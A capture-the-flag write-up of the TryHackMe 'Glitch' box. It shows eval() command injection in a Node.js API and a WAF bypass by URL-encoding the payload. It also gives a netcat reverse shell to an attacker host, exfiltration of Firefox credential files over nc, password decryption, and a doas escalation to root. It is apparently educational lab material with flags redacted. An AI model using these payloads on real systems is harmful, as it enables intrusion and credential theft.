# TryHackMe — Glitch Writeup

> **Difficulty:** Easy | **Category:** Web / Linux  
> **Platform:** TryHackMe  

---

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Command Injection](#command-injection)
- [Foothold — Reverse Shell](#foothold--reverse-shell)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Summary](#summary)
- [Remediation](#remediation)

---

## Overview

Glitch is an Easy-rated Linux box hosting a **Node.js/Express** web application.

**Attack chain:**

```
Hidden API endpoint (decoy token)
        ↓
Command injection via eval() in ?cmd parameter
        ↓
WAF bypass using URL-encoding
        ↓
Reverse shell as user
        ↓
Firefox saved credentials → pivot to v0id
        ↓
Misconfigured doas → root
```

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP>
```

```
80/tcp  open  http    nginx 1.14.0 (Ubuntu)
```

The web server proxies to an Express backend (`X-Powered-By: Express`).

---

### Directory Brute Force

```bash
feroxbuster -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak \
  -s 200,301,403,401 -t 50
```

```
200  /api/access
200  /img/glitch.jpg
200  /
200  /secret
301  /img/
301  /js/
```

> `/secret` returns the exact same page as `/` — not interesting.

---

### Inspecting the API

```bash
curl -s http://<TARGET_IP>/api/access
```

```json
{"token":"[REDACTED]"}
```

Decoding the Base64 token:

```bash
echo "[REDACTED]" | base64 -d
# [REDACTED]  ← decoy value
```

---

### Discovering the Real Functionality

Reviewing the front-end JavaScript reveals an endpoint used to render game items:

```javascript
await fetch('/api/items')
  .then(res => res.json())
  .then(res => {
    res.sins.forEach(e => {
      insertAdjacentHTML('beforeend', `<h3>${e}</h3>`)
    });
  });
```

Two observations:
- `/api/items` returns a static JSON list.
- `insertAdjacentHTML` is used with unsanitised strings → potential **DOM XSS** sink.

```bash
curl -s http://<TARGET_IP>/api/items
```

```json
{
  "sins":   ["lust","gluttony","greed","sloth","wrath","envy","pride"],
  "errors": ["error","error", ...],
  "deaths": ["death"]
}
```

---

## Command Injection

### Probing the Parameter

A POST to `/api/items` returns:

```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

Fuzzing with a parameter wordlist reveals a hidden `cmd` parameter:

```bash
curl -X POST "http://<TARGET_IP>/api/items?cmd=1%2B1"
# vulnerability_exploited 2
```

`1+1` is evaluated as JavaScript — the server calls **`eval()`** on the `cmd` parameter.

---

### WAF Behaviour

Direct attempts are blocked:

```bash
curl -X POST "http://<TARGET_IP>/api/items" \
  --data-urlencode "cmd=require('child_process').execSync('id').toString()"
# {"message":"there_is_a_glitch_in_the_matrix"}
```

A keyword filter blocks `require`, `child_process`, `exec`, etc.

---

### Bypassing the Filter — URL-Encoding

The trick: **URL-encode the entire payload** so the WAF sees only `%xx` sequences, while Express decodes it back into valid JS.

Verify RCE with `id`:

```bash
PAYLOAD='require("child_process").execSync("id").toString()'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$PAYLOAD")
curl -s -X POST "http://<TARGET_IP>/api/items?cmd=$ENCODED"
```

Output: `uid=...` → **RCE confirmed** ✅

---

## Foothold — Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Encode and send the payload:

```bash
PAYLOAD='require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f")'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$PAYLOAD")
curl -X POST "http://<TARGET_IP>/api/items?cmd=$ENCODED"
```

Stabilise the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z, then:
stty raw -echo; fg
```

---

## User Flag

```bash
cd /home/user
cat user.txt
# [REDACTED]
```

---

## Privilege Escalation

### 1. Enumerating SUID Binaries

```bash
find / -type f -perm -04000 2>/dev/null
```

Notable entry:

```
/usr/local/bin/doas
```

`sudo -l` requires a password → **`doas`** is the intended path.

---

### 2. Finding the Pivot Credential (Firefox)

A Firefox profile exists in the user's home:

```bash
ls -la ~/.firefox/b5w4643p.default-release/
```

```
-rwxrwxr-x  key4.db
-rwxrwxr-x  logins.json
```

Transfer both files to the attacker machine:

```bash
# Attacker
nc -lvnp 4444 > logins.json
nc -lvnp 4445 > key4.db

# Target
nc <ATTACKER_IP> 4444 < ~/.firefox/b5w4643p.default-release/logins.json
nc <ATTACKER_IP> 4445 < ~/.firefox/b5w4643p.default-release/key4.db
```

---

### 3. Decrypting Stored Credentials

`firefox_decrypt` may fail to initialise NSS. Use **firepwd** instead:

```bash
git clone https://github.com/lclevy/firepwd.git
cd firepwd
pip3 install pyasn1 pycryptodome
python3 firepwd.py -d ../ff/
```

Output:

```
decrypting login/password pairs
  https://glitch.thm : b'v0id' : b'[REDACTED]'
```

---

### 4. Pivoting to v0id

```bash
su v0id
# Password: [REDACTED]

id
# uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
```

---

### 5. Abusing doas → Root

Check the policy:

```bash
cat /etc/doas.conf 2>/dev/null || cat /usr/local/etc/doas.conf 2>/dev/null
```

`v0id` can run commands as root **without a password**. Escalate:

```bash
/usr/local/bin/doas -u root /bin/bash

id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### 6. Root Flag

```bash
cat /root/root.txt
# [REDACTED]
```

---

## Summary

| Stage     | Finding                                         | Impact              |
|-----------|-------------------------------------------------|---------------------|
| Recon     | `/api/access` leaks a decoy Base64 token        | Low                 |
| Recon     | `/api/items` used by front-end JS               | Informational       |
| Vuln      | `cmd` parameter passed directly to `eval()`    | **RCE**             |
| WAF       | Keyword filter blocked `require`/`exec` in plain text | Bypassable via URL-encoding |
| Foothold  | Node.js RCE → reverse shell as `user`           | **Critical**        |
| Creds     | Firefox profile stored without master password  | Credential theft    |
| PrivEsc   | `doas` misconfigured for `v0id`                 | **Root**            |


> *Writeup by SubZer030 — TryHackMe: Glitch*  
> *Flags and credentials have been redacted.*